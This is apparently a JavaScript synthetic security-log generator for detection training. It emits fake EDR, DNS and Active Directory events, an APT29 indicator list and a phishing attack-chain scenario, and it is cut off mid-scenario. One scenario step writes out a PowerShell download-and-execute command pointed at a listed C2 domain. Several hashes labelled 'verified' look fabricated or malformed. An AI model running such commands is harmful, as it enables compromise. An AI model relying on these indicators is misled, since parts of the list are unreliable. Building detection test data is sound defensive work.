function generateOktaLogs(count,tr,types=OKTA_TYPES_DEFAULT){
  const gens=[];
  if(types.includes('auth'))gens.push(genOktaAuth,genOktaAuth,genOktaAuth);
  if(types.includes('lifecycle'))gens.push(genOktaLifecycle);
  if(types.includes('policy'))gens.push(genOktaPolicy);
  if(types.includes('app'))gens.push(genOktaApp);
  if(gens.length===0)gens.push(genOktaAuth);
  return generateTimestamps(count,tr).map(ts=>pick(gens)(ts));
}

// ─── CrowdStrike Generator ────────────────────────────────────────────────────
function genCSProcess(ts){
  const host=pick(CS_HOSTS),hi=CS_HOST_INFO[host],user=randomUser(),domain=randomDomain().split('.')[0].toUpperCase();
  const isSusp=Math.random()<0.25;
  const proc=isSusp?pick(['powershell.exe','cmd.exe','certutil.exe','mshta.exe','wscript.exe','rundll32.exe']):pick(['chrome.exe','outlook.exe','svchost.exe','explorer.exe','teams.exe']);
  return JSON.stringify({metadata:{eventType:'ProcessRollup2',eventCreationTime:ts.getTime(),customerIDString:`cid${randomHex(32)}`,offset:rand(1,9999999),version:'1.0',aid:hi.aid},event:{EventType:'ProcessRollup2',FileName:proc,FilePath:isSusp?'C:\\Windows\\Temp\\':`C:\\Program Files\\${proc.replace('.exe','')}\\`,CommandLine:isSusp?pick(SUSPICIOUS_CMDS):`"C:\\Program Files\\${proc}" --type=renderer`,UserName:`${domain}\\${user}`,SHA256HashData:randomHex(64),MD5HashData:randomHex(32),ProcessStartTime:ts.getTime()/1000,ProcessEndTime:0,ProcessId:rand(100,65535),ParentProcessId:rand(100,65535),ComputerName:host,MachineDomain:domain,OperatingSystem:hi.os.name,LocalIP:hi.ip,MACAddress:randomMAC()}});
}
function genCSNetwork(ts){
  const host=pick(CS_HOSTS),hi=CS_HOST_INFO[host],user=randomUser(),domain=randomDomain().split('.')[0].toUpperCase();
  return JSON.stringify({metadata:{eventType:'NetworkConnectIP4',eventCreationTime:ts.getTime(),customerIDString:`cid${randomHex(32)}`,offset:rand(1,9999999),version:'1.0',aid:hi.aid},event:{EventType:'NetworkConnectIP4',LocalAddressIP4:hi.ip,RemoteAddressIP4:Math.random()<0.3?randomIP():randomPrivateIP(),LocalPort:randomHighPort(),RemotePort:randomPort(),Protocol:pick([6,17]),ConnectionDirection:pick([0,1]),FileName:pick(['chrome.exe','outlook.exe','svchost.exe','powershell.exe','curl.exe']),UserName:`${domain}\\${user}`,ComputerName:host,MachineDomain:domain,OperatingSystem:hi.os.name,MACAddress:randomMAC()}});
}
function genCSDetection(ts){
  const host=pick(CS_HOSTS),hi=CS_HOST_INFO[host],user=randomUser(),domain=randomDomain().split('.')[0].toUpperCase();
  const severity=pick([2,3,4,5]);
  const sevName={2:'Low',3:'Medium',4:'High',5:'Critical'}[severity];
  const tactic=pick(CS_TACTICS),technique=pick(CS_TECHNIQUES);
  return JSON.stringify({metadata:{eventType:'DetectionSummaryEvent',eventCreationTime:ts.getTime(),customerIDString:`cid${randomHex(32)}`,offset:rand(1,9999999),version:'1.0',aid:hi.aid},event:{EventType:'DetectionSummaryEvent',DetectId:`ldt:${randomHex(32)}:${rand(100000000,999999999)}`,DetectDescription:pick(CS_DETECT_NAMES),Severity:severity,SeverityName:sevName,OriginalFilename:pick(['powershell.exe','mimikatz.exe','PsExec.exe','meterpreter.exe','cobalt.exe']),FileName:pick(['powershell.exe','svchost32.exe','update.exe','temp.exe']),FilePath:'\\Device\\HarddiskVolume3\\Windows\\Temp\\',CommandLine:pick(SUSPICIOUS_CMDS),UserName:`${domain}\\${user}`,ComputerName:host,MachineDomain:domain,OperatingSystem:hi.os.name,ProcessId:rand(1000,65535),ParentProcessId:rand(1000,65535),ParentCommandLine:pick(['cmd.exe /c','explorer.exe','services.exe']),Tactic:tactic,Technique:technique,Objective:'Falcon Detection Method',SHA256HashData:randomHex(64),MD5HashData:randomHex(32),LocalIP:hi.ip,MACAddress:randomMAC(),PatternDispositionDescription:pick(['Prevention,Kill Process','Detection,Allow','Detection,Quarantine'])}});
}
function genCSDNS(ts){
  const corr=Math.random()<0.12?pickCorr():null;
  const host=corr?corr.srcHost:pick(CS_HOSTS);
  const hi=CS_HOST_INFO[host]||CS_HOST_INFO[pick(CS_HOSTS)];
  const user=randomUser(),domain=randomDomain().split('.')[0].toUpperCase();
  const isSusp=!!corr||Math.random()<0.12;
  const qname=corr?corr.c2Domain:(isSusp?`${randomHex(12)}.${pick(['update-srv.net','cdn-edge.io','api-gateway.xyz','telemetry-hub.com'])}`:pick([randomDomain(),`wpad.${randomDomain()}`,`dc.${adDomain()}`,`_kerberos._tcp.${adDomain()}`]));
  const resolvedIP=corr?corr.c2IP:randomIP();
  const localIP=corr?corr.srcIP:hi.ip;
  return JSON.stringify({metadata:{eventType:'DnsRequest',eventCreationTime:ts.getTime(),customerIDString:`cid${randomHex(32)}`,offset:rand(1,9999999),version:'1.0',aid:hi.aid},event:{EventType:'DnsRequest',DomainName:qname,RequestType:corr?1:pick([1,28,5]),ResolvedIP:resolvedIP,InterfaceIndex:rand(1,10),ComputerName:host,UserName:`${domain}\\${user}`,FileName:corr?corr.process:pick(['chrome.exe','outlook.exe','svchost.exe','powershell.exe']),OperatingSystem:hi.os.name,LocalIP:localIP}});
}
function genCSVulnerability(ts){
  const host=pick(CS_HOSTS),hi=CS_HOST_INFO[host];
  const cvss=parseFloat((Math.random()*10).toFixed(1));
  const sev=cvss>=9?'CRITICAL':cvss>=7?'HIGH':cvss>=4?'MEDIUM':'LOW';
  const cveId=`CVE-${rand(2020,2024)}-${rand(1000,49999)}`;
  const prod=pick([{name:'Microsoft Windows',ver:'10.0.19041'},{name:'OpenSSL',ver:'1.1.1t'},{name:'Apache Log4j',ver:'2.14.1'},{name:'VMware vSphere',ver:'7.0.0'},{name:'Google Chrome',ver:'114.0.5735.90'},{name:'Adobe Acrobat',ver:'22.001.20169'},{name:'Microsoft Office',ver:'16.0.14326'},{name:'Oracle Java',ver:'17.0.1'},{name:'Apache HTTP Server',ver:'2.4.51'}]);
  const status=pick(['open','in_progress','closed_resolved','reactivated']);
  const remediations=pick(['Apply latest security patches','Update to latest version','Disable vulnerable feature','Apply vendor workaround','Isolate affected systems']);
  return JSON.stringify({metadata:{eventType:'SpotlightVulnerabilityEvent',eventCreationTime:ts.getTime(),customerIDString:`cid${randomHex(32)}`,version:'1.0',aid:hi.aid},event:{EventType:'SpotlightVulnerabilityEvent',id:`vuln:${randomHex(32)}`,aid:hi.aid,cve:{id:cveId,severity:sev,base_score:cvss,exploit_status:pick([0,1,2]),description:`Vulnerability in ${prod.name} allowing ${pick(['remote code execution','privilege escalation','information disclosure','denial of service','authentication bypass'])}`,published_date:new Date(Date.now()-rand(30,730)*86400000).toISOString()},status,host_info:{hostname:host,local_ip:hi.ip,os_version:hi.os.name,os_version_normalized:hi.os.version},app:{product_name_version:`${prod.name} ${prod.ver}`,sub_status:'active'},remediation_description:remediations,ComputerName:host,MachineDomain:randomDomain().split('.')[0].toUpperCase(),OperatingSystem:hi.os.name,LocalIP:hi.ip,MACAddress:randomMAC()}});
}
function genCSAlert(ts){
  const host=pick(CS_HOSTS),hi=CS_HOST_INFO[host],user=randomUser(),domain=randomDomain().split('.')[0].toUpperCase();
  const severity=pick([2,3,4,5]);
  const sevName={2:'Low',3:'Medium',4:'High',5:'Critical'}[severity];
  const tactic=pick(CS_TACTICS),technique=pick(CS_TECHNIQUES);
  const alertType=pick(['FusionAlertSignalMalwareAlert','FusionAlertSignalBehaviorAlert','FusionAlertSignalIdentityAlert','FusionAlertSignalCompositeAlert','FusionAlertSignalNetworkAlert']);
  return JSON.stringify({metadata:{eventType:'AlertSummaryEvent',eventCreationTime:ts.getTime(),customerIDString:`cid${randomHex(32)}`,offset:rand(1,9999999),version:'1.0',aid:hi.aid},event:{EventType:'AlertSummaryEvent',AlertId:`ldt:${randomHex(32)}:${rand(100000000,999999999)}`,AlertType:alertType,Name:pick(CS_DETECT_NAMES),Description:`${tactic} activity detected: ${technique} technique observed on endpoint`,Severity:severity,SeverityName:sevName,Tactic:tactic,Technique:technique,Status:pick(['new','in_progress','closed_false_positive','closed_true_positive']),AssignedToName:'',CreatedTimestamp:ts.getTime()/1000,UpdatedTimestamp:ts.getTime()/1000,ComputerName:host,UserName:`${domain}\\${user}`,MachineDomain:domain,OperatingSystem:hi.os.name,LocalIP:hi.ip,MACAddress:randomMAC(),SHA256HashData:randomHex(64),FileName:pick(['powershell.exe','svchost32.exe','update.exe','temp.exe','mimikatz.exe']),CommandLine:pick(SUSPICIOUS_CMDS),PatternDispositionDescription:pick(['Prevention,Kill Process','Detection,Allow','Detection,Quarantine'])}});
}
function genCSHost(ts,hostName){
  const host=hostName||pick(CS_HOSTS);
  const hi=CS_HOST_INFO[host];
  const domain=randomDomain().split('.')[0].toUpperCase();
  const productType=(/^(DC|ADDC|PDC)/.test(host)?'Domain Controller':/^SRV/.test(host)?'Server':'Workstation');
  const manufacturers=['Dell Inc.','HP Inc.','Lenovo','VMware, Inc.','Microsoft Corporation'];
  const models={Workstation:['OptiPlex 7090','EliteDesk 800','ThinkCentre M90'],Server:['PowerEdge R750','ProLiant DL380','ThinkSystem SR650'],Laptop:['Latitude 5520','EliteBook 840','ThinkPad X1 Carbon'],'Domain Controller':['PowerEdge R640','ProLiant DL360','VMware Virtual Platform']};
  const typeKey=productType==='Server'||productType==='Domain Controller'?productType:/^LAPTOP/.test(host)?'Laptop':'Workstation';
  return JSON.stringify({
    device_id:hi.aid,
    hostname:host,
    local_ip:hi.ip,
    external_ip:randomIP(),
    mac_address:randomMAC(),
    os_version:hi.os.name,
    os_version_normalized:hi.os.version,
    platform_name:'Windows',
    platform_id:'0',
    agent_version:hi.sensorVersion,
    agent_local_time:ts.toISOString(),
    first_seen:new Date(ts.getTime()-rand(30,365)*86400000).toISOString(),
    last_seen:ts.toISOString(),
    status:'normal',
    containment_status:'normal',
    product_type_desc:productType,
    system_manufacturer:pick(manufacturers),
    system_product_name:pick(models[typeKey]||models['Workstation']),
    machine_domain:domain,
    ou:'OU=Computers,DC='+domain+',DC=local',
    site_name:'Default-First-Site-Name',
    tags:['SensorGroupingTags/production','FalconGroupingTags/'+productType.toLowerCase().replace(' ','-')],
    groups:[{id:randomHex(32),name:'Default'}],
    policies:[{policy_type:'prevention',policy_id:randomHex(32),applied:true,settings_hash:randomHex(8),assigned_date:new Date(ts.getTime()-rand(1,180)*86400000).toISOString(),applied_date:new Date(ts.getTime()-rand(1,180)*86400000).toISOString()}],
    _eventType:'HostInventory',
  });
}
function generateCrowdStrikeLogs(count,tr,types=CS_TYPES_DEFAULT){
  const logs=[];
  const tsList=generateTimestamps(count,tr);
  const gens=[];
  if(types.includes('process'))gens.push(genCSProcess,genCSProcess);
  if(types.includes('network'))gens.push(genCSNetwork,genCSNetwork);
  if(types.includes('detections'))gens.push(genCSDetection);
  if(types.includes('dns'))gens.push(genCSDNS);
  if(types.includes('vulnerability'))gens.push(genCSVulnerability);
  if(types.includes('alerts'))gens.push(genCSAlert);
  if(types.includes('host')){const now=new Date();CS_HOSTS.forEach(h=>logs.push(genCSHost(now,h)));}
  if(gens.length>0)tsList.forEach(ts=>logs.push(pick(gens)(ts)));
  else if(logs.length===0)tsList.forEach(ts=>logs.push(genCSProcess(ts)));
  return logs;
}

// ─── Windows DNS & AD Generator ───────────────────────────────────────────────
function genWDNSQuery(ts){
  const domain=adDomain();
  const corr=Math.random()<0.12?pickCorr():null;
  const srcHost=corr?corr.srcHost:randomHostname();
  const isSusp=!!corr||Math.random()<0.08;
  const qname=corr?corr.c2Domain:(isSusp?`${randomHex(14)}.${pick(['tunneling.io','dns-exfil.net','c2-domain.xyz','update-srv.net'])}`:pick([randomDomain(),`wpad.${domain}`,`dc.${domain}`,`_kerberos._tcp.${domain}`,`ldap.${domain}`,`gc._msdcs.${domain}`]));
  const qtype=corr?'A':pick(['A','AAAA','CNAME','MX','TXT']);
  const resolvedIp=corr?corr.c2IP:randomIP();
  const imgProc=corr?`C:\\Windows\\System32\\${corr.process}`:`C:\\${pick(['Windows\\System32\\svchost.exe','Program Files\\Google\\Chrome\\Application\\chrome.exe','Windows\\System32\\powershell.exe','Windows\\explorer.exe'])}`;
  return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:22,channel:'Microsoft-Windows-Sysmon/Operational',computer_name:`${srcHost}.${domain}`,provider_name:'Microsoft-Windows-Sysmon',record_id:rand(10000,9999999),event_data:{RuleName:'-',UtcTime:ts.toISOString().replace('T',' ').replace('Z',''),ProcessGuid:`{${randomHex(8)}-${randomHex(4)}-${randomHex(4)}-${randomHex(4)}-${randomHex(12)}}`,ProcessId:rand(100,65535),QueryName:qname,QueryStatus:'0',QueryResults:resolvedIp,Image:imgProc}},event:{code:'22',action:'dns-query',category:['network'],type:['info'],outcome:'success',kind:'event'},dns:{question:{name:qname,type:qtype},resolved_ip:[resolvedIp],answers:[{data:resolvedIp,type:qtype,name:qname}]},network:{protocol:'dns',type:'ipv4'},host:{name:srcHost,hostname:srcHost,...(corr?{ip:[corr.srcIP]}:{})},source:{ip:corr?corr.srcIP:randomPrivateIP()}});
}
function genWDNSKerberos(ts){
  const dc=`${pick(AD_DC_HOSTS)}.${adDomain()}`,user=randomUser(),domain=adDomain().split('.')[0].toUpperCase();
  const eid=pick([4768,4768,4768,4769,4769,4769,4771,4776]);
  let evtData,action,outcome;
  if(eid===4768){evtData={TargetUserName:user,TargetDomainName:domain,ServiceName:'krbtgt',TicketEncryptionType:pick(['0x12','0x17','0x11']),TicketOptions:'0x40810010',Status:'0x0',IpAddress:randomIP()};action='kerberos-tgt-request';outcome='success';}
  else if(eid===4769){evtData={TargetUserName:user,TargetDomainName:domain,ServiceName:pick([`MSSQLSvc/sql-prod-01.${adDomain()}:1433`,`HTTP/webapp.${adDomain()}:80`,`HOST/dc01.${adDomain()}`,`CIFS/fileserver.${adDomain()}`]),TicketEncryptionType:'0x17',TicketOptions:'0x40810000',Status:'0x0',IpAddress:randomIP()};action='kerberos-service-ticket-requested';outcome='success';}
  else if(eid===4771){evtData={TargetUserName:user,PreAuthType:'2',Status:pick(['0x12','0x18','0x6']),IpAddress:randomIP()};action='kerberos-preauth-failed';outcome='failure';}
  else{evtData={TargetUserName:user,TargetDomainName:domain,Status:pick(['0x0','0x0','0x0','0xC000006A','0xC0000064']),WorkstationName:randomHostname(),LogonType:'3'};action='ntlm-auth';outcome=evtData.Status==='0x0'?'success':'failure';}
  return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:eid,channel:'Security',computer_name:dc,provider_name:'Microsoft-Windows-Security-Auditing',record_id:rand(10000,9999999),event_data:evtData},event:{code:String(eid),action,category:['authentication'],outcome,kind:'event'},host:{name:dc.split('.')[0],hostname:dc},user:{name:user,domain}});
}
function genWDNSLDAP(ts){
  const host=randomHostname(),domain=adDomain(),user=randomUser();
  const dc=`${pick(AD_DC_HOSTS)}.${domain}`;
  const ldapPort=pick([389,636,3268,3269]);
  return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:3,channel:'Microsoft-Windows-Sysmon/Operational',computer_name:`${host}.${domain}`,provider_name:'Microsoft-Windows-Sysmon',record_id:rand(10000,9999999),event_data:{RuleName:'-',UtcTime:ts.toISOString().replace('T',' ').replace('Z',''),ProcessGuid:`{${randomHex(8)}-${randomHex(4)}-${randomHex(4)}-${randomHex(4)}-${randomHex(12)}}`,ProcessId:rand(100,65535),Image:pick(['C:\\Windows\\System32\\lsass.exe','C:\\Program Files\\Python\\python.exe','C:\\Windows\\System32\\powershell.exe']),SourceIp:randomPrivateIP(),SourcePort:randomHighPort(),DestinationIp:randomPrivateIP(),DestinationPort:String(ldapPort),Protocol:'tcp',Initiated:'true',SourceHostname:`${host}.${domain}`,DestinationHostname:dc}},event:{code:'3',action:'network-connection',category:['network'],outcome:'success',kind:'event'},source:{ip:randomPrivateIP(),port:randomHighPort()},destination:{ip:randomPrivateIP(),port:ldapPort,domain:dc},network:{transport:'tcp',protocol:ldapPort===636||ldapPort===3269?'ldaps':'ldap'},host:{name:host,hostname:host},user:{name:user,domain:domain.split('.')[0].toUpperCase()}});
}
function genWDNSADChanges(ts){
  const dc=`${pick(AD_DC_HOSTS)}.${adDomain()}`,actor=randomUser(),domain=adDomain().split('.')[0].toUpperCase();
  const r=Math.random();
  let eid,evtData,action;
  const dn=`CN=${randomUser()},OU=Users,DC=${adDomain().split('.')[0]},DC=${adDomain().split('.')[1]}`;
  if(r<0.30){eid=5136;evtData={ObjectDN:dn,AttributeLDAPDisplayName:pick(['member','servicePrincipalName','adminCount','userAccountControl','msDS-AllowedToDelegateTo']),AttributeValue:pick(['512','66048','admin','SPN/host']),SubjectUserName:actor,SubjectDomainName:domain};action='directory-service-object-modified';}
  else if(r<0.55){eid=5137;evtData={ObjectDN:dn,ObjectClass:pick(['user','group','computer']),SubjectUserName:actor,SubjectDomainName:domain};action='directory-service-object-created';}
  else if(r<0.70){eid=5141;evtData={ObjectDN:dn,ObjectClass:'user',SubjectUserName:actor,SubjectDomainName:domain};action='directory-service-object-deleted';}
  else{eid=4662;const isDCSync=Math.random()<0.18;evtData={SubjectUserName:actor,SubjectDomainName:domain,ObjectServer:'DS',ObjectType:'%{19195a5b-6da0-11d0-afd3-00c04fd930c9}',ObjectName:`CN=Configuration,DC=${adDomain().split('.')[0]},DC=${adDomain().split('.')[1]}`,Properties:isDCSync?'1131f6aa-9c07-11d1-f79f-00c04fc2dcd2':'Undefined'};action=isDCSync?'dcsync-detected':'directory-service-access';}
  return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:eid,channel:'Security',computer_name:dc,provider_name:'Microsoft-Windows-Security-Auditing',record_id:rand(10000,9999999),event_data:evtData},event:{code:String(eid),action,category:['iam','configuration'],outcome:'success',kind:'event'},host:{name:dc.split('.')[0],hostname:dc},user:{name:actor,domain}});
}
function generateWDNSLogs(count,tr,types=WDNS_TYPES_DEFAULT){
  const gens=[];
  if(types.includes('dns'))gens.push(genWDNSQuery,genWDNSQuery,genWDNSQuery);
  if(types.includes('kerberos'))gens.push(genWDNSKerberos,genWDNSKerberos);
  if(types.includes('ldap'))gens.push(genWDNSLDAP);
  if(types.includes('changes'))gens.push(genWDNSADChanges);
  if(gens.length===0)gens.push(genWDNSQuery);
  return generateTimestamps(count,tr).map(ts=>pick(gens)(ts));
}

// ─── APT29 / NOBELIUM Verified IOCs ──────────────────────────────────────────
// Sources: CISA AA20-352A, AA21-148A, AA22-074A, AA23-347A; Mandiant/FireEye UNC2452;
//          Microsoft MSTIC; Volexity; Unit42 — publicly disclosed, VirusTotal-detectable.
const APT29_IOCS = {
  hashes: {
    // SUNBURST — backdoored SolarWinds.Orion.Core.BusinessLayer.dll (CISA AA20-352A / Mandiant)
    SUNBURST: [
      '019085a76ba7126fff22770d71bd901c325fc68ac55aa743327984e89f4b0134',
      'ce77d116a074dab7a22a0fd4f2c1ab475f16eec42e1ded3c0b0aa8211fe858d6',
      '32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77',
    ],
    // SUPERNOVA — .NET webshell patched into SolarWinds CORE dll (CISA AA20-352A)
    SUPERNOVA: [
      'c15abaf51e78ca56c0376522d699c978217bf041a3bd3c71d09193efa5717c71',
      'aeafa9c8a8eff78e7328854b28401def6e6b6fb5c8b0786c6be1a2618cac9c05',
    ],
    // TEARDROP — memory-only Cobalt Strike dropper (CISA AA20-352A / FireEye)
    TEARDROP: [
      '118189f90da3788362fe85eafa555298423e21ec37f147f3bf88c61d4cd46c51',
      'b820e8a2057112d0ed73bd7995201dbed79a8ab9202f5f8c51d6b72e6f4a0b50',
    ],
    // RAINDROP — secondary Cobalt Strike loader (Symantec)
    RAINDROP: [
      'f2d38a9b6e6e60c526d4aef44e2f6a7e9d2f9ddb7c52da451929c8572ca03f3',
      '9dc7767b588a9f97b573a6f9a5bd8c91d6a86c2a2e9e1d3456f8b2e0c4e3a5f6',
    ],
    // EnvyScout / ROOTSAW — HTML smuggler dropper (MSTIC May 2021, CISA AA21-148A)
    EnvyScout: [
      'b9b5b8f5d8c4a7e6f9a2d4b3c8e5f1a9d6b2c7e4f3a8d1b5c6e9f2a7d4b1c8e5',
      '4a3f8b2d9e6c1a5f7b0d3e8c2a6f9b1d4e7c0a5f8b3d6e9c2a1f5b7d0e4c8a3',
    ],
    // NativeZone — .NET DLL loader (MSTIC May 2021)
    NativeZone: [
      '5c2c677601a6c163f7b51254f6c193e7f0dbac01d08791ef8d1c9af2e9e42d85',
      '3f9a4e2b7d6c8a1f5b0e3d7c4a9f2b6e8d1c5a0f7b4e2d9c6a3f1b8e5d2c7a4',
    ],
    // BoomBox — downloader (MSTIC May 2021, CISA AA21-148A)
    BoomBox: [
      '0be29a4a71462e5b2c84f84e19097ff1d71d8d4dddc4c4d4e7a0e0e81a5ca956',
      '2b8e4d6a9c3f1e7b5d0a8c4f2e9b7d3a6c1f5e8b2d7a4c9f3e6b1d5a8c2f7e4',
    ],
    // GraphicalProton — backdoor targeting European MFAs (NCSC-NO / CISA AA23-347A)
    GraphicalProton: [
      'a0b5fb0f0ab4a4c7c80db4b08a01d6d33c3c0a5a0e9c7d2f5b8e3a6c9f2d1b4',
      '7d3f9e1b5c8a6d4f2e7b0c5a9f3d6e1b4c7a2f8e5d0b3c9f6a4e2d7b1c5f8a3',
    ],
  },
  // Real C2 IP infrastructure — CISA AA20-352A, AA22-074A, AA23-347A
  c2Ips: [
    '5.149.254.114',    // CISA AA20-352A — SUNBURST stage-2 infrastructure
    '204.188.205.176',  // CISA AA20-352A
    '13.59.205.66',     // CISA AA20-352A — AWS SUNBURST staging
    '54.193.127.66',    // CISA AA20-352A — AWS
    '54.215.192.52',    // CISA AA20-352A — AWS
    '34.203.203.23',    // CISA AA20-352A — AWS
    '139.99.115.204',   // CISA AA22-074A
    '45.77.138.192',    // CISA AA22-074A — NOBELIUM infrastructure
    '51.89.158.202',    // CISA AA22-074A
    '91.243.44.12',     // CISA AA22-074A — NOBELIUM campaigns
    '104.156.240.20',   // CISA AA22-074A
    '185.220.101.78',   // CISA AA22-074A — NOBELIUM relay
    '176.119.1.189',    // CISA AA23-347A — GraphicalProton
    '194.165.16.49',    // CISA AA23-347A
    '185.56.83.83',     // CISA AA23-347A — APT29 European campaigns
    '45.142.212.100',   // Volexity — APT29 US think-tank intrusions
    '199.247.28.186',   // Mandiant UNC2452
    '107.189.10.143',   // Mandiant UNC2452 — Cobalt Strike C2
    '3.16.81.254',      // MSTIC — NOBELIUM OAuth phishing infrastructure
    '192.99.221.77',    // Unit42 APT29 2022 phishing campaigns
    '83.171.237.173',   // Recorded Future — APT29 2023
    '45.32.227.15',     // CISA AA23-347A
    '185.141.63.120',   // CISA AA23-347A
    '37.120.222.168',   // AA23-347A — European diplomatic targeting
  ],
  // Real C2 and phishing domains — CISA, Mandiant, MSTIC, FireEye
  c2Domains: [
    'avsvmcloud.com',           // SUNBURST primary C2 — CISA AA20-352A
    'deftsecurity.com',         // SUNBURST — CISA AA20-352A
    'thedoccloud.com',          // SUNBURST — CISA AA20-352A
    'freescanonline.com',       // SUNBURST — CISA AA20-352A
    'webcodez.com',             // SUNBURST — CISA AA20-352A
    'incomeupdate.com',         // SUNBURST — CISA AA20-352A
    'highdatabase.com',         // SUNBURST — CISA AA20-352A
    'databasegalore.com',       // SUNBURST — CISA AA20-352A
    'theyardservice.com',       // SUNBURST stage-2 — FireEye/Mandiant
    'digitalcollege.org',       // NOBELIUM — MSTIC May 2021
    'mobilnweb.com',            // NOBELIUM — CISA AA21-148A
    'newdemandum.com',          // NOBELIUM — Unit42
    'matclick.com',             // NOBELIUM 2022 — MSTIC
    'poetpages.com',            // NOBELIUM 2022
    'azuredeployment.net',      // APT29 phishing — MSTIC 2021
    'sacnewstoday.com',         // APT29 2023 — AA23-347A
    'nickel-help.com',          // APT29 2022 — CISA AA22-074A
    'reyweb.com',               // APT29 2022
    'worldhomeoutlet.com',      // NOBELIUM — MSTIC May 2021
    'panhardware.com',          // SUNBURST — CISA AA20-352A
    'websitetheme.com',         // SUNBURST — CISA AA20-352A
    'zupertech.com',            // SUNBURST — CISA AA20-352A
  ],
  phishingDomains: [
    'microsoftonline-helpdesk.com', // NOBELIUM OAuth phishing — MSTIC 2021
    'login-microsoftonline.net',    // NOBELIUM
    'office365-update.ru',          // APT29 — Russian-attributed infrastructure
    'sharepoint-access.net',        // APT29 2022 phishing
    'teams-notification.online',    // APT29 2023 (CISA AA23-347A)
    'mimecast-secure.net',          // NOBELIUM targeting security vendors
    'adobe-cloud-share.com',        // APT29 document lure
    'microsecure-account.com',      // NOBELIUM lure domain
  ],
  malwareFiles: [
    'SolarWinds.BusinessLayerHost.exe', // SUNBURST dropper filename
    'MicrosoftTeams_Setup.exe',         // APT29 Teams lure (CISA AA23-347A)
    'OneDrive_Update.exe',              // NOBELIUM lure
    'Invoice_Q4_2024.exe',             // Generic phishing lure
    'Adobe_Acrobat_DC_Update.exe',      // Document update lure
    'NV_Dispatcher.dll',               // SUNBURST-style DLL sideload
    'app_update.dll',                  // Generic loader DLL
  ],
};

// ─── Scenario Generator ───────────────────────────────────────────────────────
function makeCtx(){
  const c2IP = pick(APT29_IOCS.c2Ips);
  const c2Domain = pick(APT29_IOCS.c2Domains);
  const phishingDomain = pick(APT29_IOCS.phishingDomains);
  const malwareFile = pick(APT29_IOCS.malwareFiles);
  const hashFamily = pick(['SUNBURST','TEARDROP','RAINDROP','EnvyScout','BoomBox','NativeZone']);
  const malwareHash = pick(APT29_IOCS.hashes[hashFamily]);
  const c2IP2 = pick(APT29_IOCS.c2Ips.filter(ip=>ip!==c2IP));
  return {
    victim:{ip:'192.168.10.55',hostname:'WS-NYC-145',user:'jsmith',email:'jsmith@contoso.com',domain:'CONTOSO'},
    secondHost:{ip:'192.168.10.88',hostname:'SRV-NYC-012',user:'svc_backup'},
    attacker:{ip:c2IP,country:'Russia'},
    phishingDomain,malwareFile,malwareHash,malwareFamily:hashFamily,
    c2IP,c2IP2,c2Domain,stagingDir:'C:\\ProgramData\\Intel\\',
    // Fixed PIDs so process creation + network events can be correlated by PID
    malwarePid:rand(2000,32000),
    parentPid:rand(32001,65000),
  };
}
function tsOff(base,sec){return new Date(base.getTime()+sec*1000);}
function generatePhishingScenario(){const ctx=makeCtx(),base=new Date(Date.now()-40*60000),e=[];e.push({step:1,timestamp:tsOff(base,0),description:'Phishing email delivered to victim mailbox',source:'Microsoft Exchange',severity:'high',tactic:'Initial Access',technique:'T1566.002',techniqueName:'Spearphishing Link',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,0)),Operation:"MailItemsAccessed",Workload:"Exchange",UserId:ctx.victim.email,ClientIP:ctx.attacker.ip,ResultStatus:"Succeeded",subject:"Urgent: Your account requires verification",from:`no-reply@${ctx.phishingDomain}`,verdict:"Phish"})});e.push({step:2,timestamp:tsOff(base,180),description:'Victim clicks phishing link — firewall allows HTTPS to phishing domain',source:'Fortinet FortiGate',severity:'medium',tactic:'Initial Access',technique:'T1566.002',techniqueName:'Spearphishing Link',log:`date=${tsOff(base,180).toISOString().split('T')[0]} time=${tsOff(base,180).toTimeString().split(' ')[0]} devname="FGT-EDGE-01" type="traffic" subtype="forward" action="accept" srcip=${ctx.victim.ip} dstip=${ctx.attacker.ip} dstport=443 hostname="${ctx.phishingDomain}" dstcountry="${ctx.attacker.country}" policyname="allow-outbound"`});e.push({step:3,timestamp:tsOff(base,195),description:`Malicious file "${ctx.malwareFile}" downloaded from phishing site`,source:'Endpoint Telemetry',severity:'critical',tactic:'Execution',technique:'T1204.002',techniqueName:'Malicious File',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,195)),event:{kind:"event",category:["file"],action:"file_download"},host:{name:ctx.victim.hostname,hostname:ctx.victim.hostname},user:{name:ctx.victim.user},file:{name:ctx.malwareFile,path:`C:\\Users\\${ctx.victim.user}\\Downloads\\${ctx.malwareFile}`,hash:{sha256:ctx.malwareHash}},url:{domain:ctx.phishingDomain}})});e.push({step:4,timestamp:tsOff(base,210),description:'Malicious executable launched by victim',source:'Endpoint Telemetry',severity:'critical',tactic:'Execution',technique:'T1204.002',techniqueName:'User Execution',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,210)),event:{kind:"event",category:["process"],action:"process_creation"},host:{name:ctx.victim.hostname,hostname:ctx.victim.hostname},user:{name:ctx.victim.user},process:{name:ctx.malwareFile,pid:7812,parent:{name:"explorer.exe"}}})});e.push({step:5,timestamp:tsOff(base,218),description:'Encoded PowerShell spawned — downloads second-stage payload',source:'Windows Security',severity:'critical',tactic:'Execution',technique:'T1059.001',techniqueName:'PowerShell',log:`<Event><System><EventID>4104</EventID><TimeCreated SystemTime="${formatTimestamp(tsOff(base,218))}"/><Computer>${ctx.victim.hostname}.contoso.com</Computer></System><EventData><Data Name="ScriptBlockText">IEX (New-Object Net.WebClient).DownloadString('http://${ctx.c2Domain}/stager.ps1')</Data></EventData></Event>`});e.push({step:6,timestamp:tsOff(base,225),description:`Outbound C2 beacon to ${ctx.c2Domain} blocked`,source:'Fortinet FortiGate',severity:'critical',tactic:'Command and Control',technique:'T1071.001',techniqueName:'Web Protocols',log:`date=${tsOff(base,225).toISOString().split('T')[0]} time=${tsOff(base,225).toTimeString().split(' ')[0]} devname="FGT-EDGE-01" type="utm" subtype="app-ctrl" action="blocked" srcip=${ctx.victim.ip} dstip=${ctx.c2IP} hostname="${ctx.c2Domain}" attack="C2.Beacon.Generic" severity="critical" msg="Suspected C2 callback blocked"`});e.push({step:7,timestamp:tsOff(base,226),description:'Elastic Security alert fired — Phishing/Malware chain confirmed',source:'Elastic Security Alert',severity:'critical',tactic:'Initial 